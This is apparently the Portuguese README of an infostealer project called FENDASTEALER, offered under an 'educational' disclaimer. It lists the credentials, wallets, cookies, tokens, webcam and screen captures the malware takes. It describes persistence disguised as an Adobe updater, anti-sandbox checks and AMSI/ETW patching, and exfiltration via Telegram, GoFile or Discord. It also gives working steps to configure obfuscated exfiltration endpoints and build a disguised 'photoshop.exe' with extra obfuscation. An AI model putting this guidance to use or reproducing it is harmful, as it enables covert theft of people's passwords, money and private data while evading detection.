<div align="center">

# 🕷️ FENDASTEALER

**Furtador de informações para Windows — projeto educacional de pesquisa em segurança**

[![Python](https://img.shields.io/badge/Python-3.13-3776AB?style=for-the-badge&logo=python&logoColor=white)](https://www.python.org/)
[![Windows](https://img.shields.io/badge/Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)]()
[![License](https://img.shields.io/github/license/MtxTheus1/fendastealer?style=for-the-badge)](LICENSE)
[![Stars](https://img.shields.io/github/stars/MtxTheus1/fendastealer?style=for-the-badge)](https://github.com/MtxTheus1/fendastealer)
[![Forks](https://img.shields.io/github/forks/MtxTheus1/fendastealer?style=for-the-badge)](https://github.com/MtxTheus1/fendastealer)
[![Issues](https://img.shields.io/github/issues/MtxTheus1/fendastealer?style=for-the-badge)](https://github.com/MtxTheus1/fendastealer)
[![Educational Only](https://img.shields.io/badge/Educacional-Somente-red?style=for-the-badge)]()
[![Author](https://img.shields.io/badge/Autor-MtxTheus1-blue?style=for-the-badge)](https://github.com/MtxTheus1)

</div>

---

> ## ⚠️ AVISO LEGAL — LEIA PRIMEIRO
>
> **Este projeto existe estritamente para fins EDUCACIONAIS e de pesquisa defensiva.**
> Ele demonstra como malwares furtadores de credenciais funcionam no Windows para que
> defensores, analistas de malware e estudantes entendam as técnicas: persistência,
> evasão de sandbox, coleta de dados e exfiltração.
>
> * Usar este código contra qualquer sistema **sem autorização escrita e explícita é crime**
>   na maioria dos países (Marco Civil, Lei Carolina Dieckmann — Brasil, GDPR, CFAA etc.).
> * O autor **não se responsabiliza** por qualquer uso indevido. A responsabilidade é toda sua.
> * **Nunca envie builds com tokens reais de exfiltração** para o VirusTotal ou locais públicos.
>
> Se você é de blue team: esta é uma referência legível e segura de "como os malwares funcionam".

---

## 📋 O que é

`fendastealer.py` é um stealer **Windows-only de arquivo único**, escrito para ser fácil de
ler e estudar. Ele coleta credenciais e sessões de navegadores, informações do sistema,
chaves de WiFi, credenciais de desenvolvedor/nuvem e muito mais, empacota tudo em um ZIP e
exfiltra por um canal configurável (bot do Telegram → GoFile → webhook do Discord).

Funciona **sem privilégios de administrador** — elevação só habilita capacidades *extras*.

## 🧬 Dados coletados

| Categoria | Detalhes |
|---|---|
| Navegadores (Chromium + Firefox) | senhas, cookies, cartões, histórico, downloads, extensões de carteira cripto |
| Sessões de chat/games | tokens do Discord (+billing/nitro), cookies do Roblox (`.ROBLOSECURITY`) |
| Carteiras desktop | Exodus, Atomic, Binance, Electrum, perfis MetaMask, Ledger/Trezor, +40 outras |
| Sistema | info do SO, IP público/local, RAM/CPU/disco, processos, conexões, software instalado, **product key do Windows**, impressoras, proxy & segredos de env |
| Rede | **redes WiFi salvas + senhas** (`netsh wlan`), conexões |
| Credenciais | `cmdkey` (credenciais do Windows), histórico do PowerShell, RDP salvo, contas locais |
| Dev/nuvem | `.ssh/`, `.aws/`, gcloud, `.kube/`, `.docker/`, `.gnupg/`, `.netrc`, `.pgpass`, `.npmrc`, `.gitconfig` |
| Mensageiros/FTP | `tdata` do Telegram, perfis FileZilla/WinSCP |
| Artefatos | **screenshot**, **webcam**, clipboard, "arquivos interessantes" (Desktop/Downloads/Documents) filtrados por palavras-chave (seed phrases, senhas, 2FA, banco…) |

## ⚙️ Como funciona

```
execução
 ├─ remove Mark-of-the-Web
 ├─ persistência (pasta Startup + HKCU\...\Run "AdobeUpdateService")   [pulado com --test]
 ├─ sleep 60-150 s  (anti-sandbox; 2-5 s com --test)
 ├─ patches em memória de AMSI/ETW (best effort)
 ├─ extras de admin (política/exclusão do Defender, bloquear Task Manager) [só elevado]
 ├─ checks anti-sandbox / anti-debug                                   [ignorados com --test]
 ├─ coleta tudo -> SK_<aleatório>.zip
 ├─ exfil: bot do Telegram -> GoFile -> webhook do Discord (primeiro que funcionar)
 └─ limpeza: remove MOTW + autodestruição (só build compilado)
```

### Persistência e autodestruição

| Cenário | Comportamento |
|---|---|
| Primeira execução | copia-se para a pasta Startup + cria `AdobeUpdateService` no Run (HKCU) |
| Execução manual do exe compilado | coleta, exfiltra e **agenda a própria exclusão** (~3 s após sair) |
| Execução a partir da cópia da Startup | **não** se apaga (mantém a persistência) |
| Execução como `.py` / `--test` | sem autodestruição e sem persistência |

## 📁 Estrutura do projeto

```
fendastealer/
├── src/
│   └── fendastealer.py        # todo o stealer (arquivo único, ~2.2k linhas)
├── scripts/
│   ├── build_nuitka.ps1       # build Nuitka (recomendado, sem assinatura do PyInstaller)
│   └── ms_sign.ps1            # helper opcional de assinatura de código (cert próprio)
├── assets/
│   └── logo.ico               # ícone do executável
├── requirements.txt           # dependências fixadas
├── .gitignore
├── LICENSE
└── README.md / README.pt-BR.md
```

## 🚀 Começando (laboratório local)

> Teste **somente** em máquinas suas, numa VM, com bot do Telegram/webhook descartáveis.

### 1. Ambiente

```powershell
python -m venv .venv
.\.venv\Scripts\Activate.ps1
pip install -r requirements.txt
pip install nuitka ordered-set zstandard
```

### 2. Configurar o canal de exfiltração

Todos os endpoints de rede no código estão ofuscados (base64 do texto invertido) e são
decodificados apenas em runtime. O repo publica com **placeholders** — coloque seus valores:

```powershell
python src\fendastealer.py enc "https://discord.com/api/webhooks/..."   # -> WEBHOOK_ENC
python src\fendastealer.py enc "1234567890:AA...token-do-bot"           # -> TELEGRAM_TOKEN_ENC
python src\fendastealer.py enc "123456789"                              # -> TELEGRAM_CHAT_ENC
```

Cole os valores impressos por cima dos placeholders no fim de `src/fendastealer.py`
(`WEBHOOK_ENC`, `TELEGRAM_TOKEN_ENC`, `TELEGRAM_CHAT_ENC`). Crie o bot com o
**@BotFather**, mande uma mensagem pra ele e pegue seu `chat_id` no `getUpdates`.

### 3. Gerar o executável (Nuitka — recomendado)

```powershell
powershell -ExecutionPolicy Bypass -File scripts\build_nuitka.ps1
# saída: .\photoshop.exe  (nome/ícone/versão configuráveis no script)
```

O Nuitka compila Python para C — sem assinatura do PyInstaller. Na primeira vez ele baixa
o toolchain Zig automaticamente. Para ofuscação extra, rode o PyArmor antes do Nuitka:
`pyarmor gen --pack onefile src\fendastealer.py`.

### 4. Testar o pipeline (sem persistência, delay curto)

```powershell
python src\fendastealer.py --test
```

O `--test` pula persistência e checks de sandbox/debugger, e imprime quais indicadores de
sandbox *disparariam* — ótimo para estudar a lógica anti-análise. O ZIP deve chegar no seu
chat do Telegram.

## 🛡️ Anti-análise e evasão (notas de estudo)

- **Checks de sandbox/VM**: DLLs de VM conhecidas, prefixos de MAC (VMware, VirtualBox,
  QEMU/KVM, Hyper-V), RAM/CPU baixos, uptime < 60 s, resolução de tela pequena, ausência
  de input do usuário por 3 h+.
- **Blacklist de processos de análise/debug**: x64dbg/IDA/Ghidra/Wireshark/Procmon etc.
- **Execução adiada** (60–150 s) para sobreviver a janelas curtas de detonação automática.
- **Patches em memória de AMSI + ETW**, com o payload de patch **codificado via XOR no
  build** para a sequência conhecida `B8 57 00 07 80 C3` não aparecer contígua.
- **Ofuscação de strings** de endpoints, comandos (`netsh`, `cmdkey`, …) e chaves.
- **Código "telemetria" falso** (`SystemDiagnostics`) intercalado com módulos reais para
  quebrar heurísticas de sequência.

**Limitações honestas:** nenhuma ofuscação garante "invisibilidade 100%". A detecção
depende do build final, do AV/EDR alvo e do comportamento em execução. "FUD" no mundo real
é um alvo móvel — este repo serve para *entender* a corrida armamentista, não para vencê-la
para sempre.

## 📚 Referências

- [MITRE ATT&CK — T1555 Credentials from Password Stores](https://attack.mitre.org/techniques/T1555/)
- [MITRE ATT&CK — T1056 Input Capture](https://attack.mitre.org/techniques/T1056/)
- [Pesquisa sobre bypass de AMSI](https://amsi.fail/)
- [VirusTotal](https://www.virustotal.com/)

## 📄 Licença

[MIT](LICENSE) — somente para fins educacionais. Veja o aviso acima.
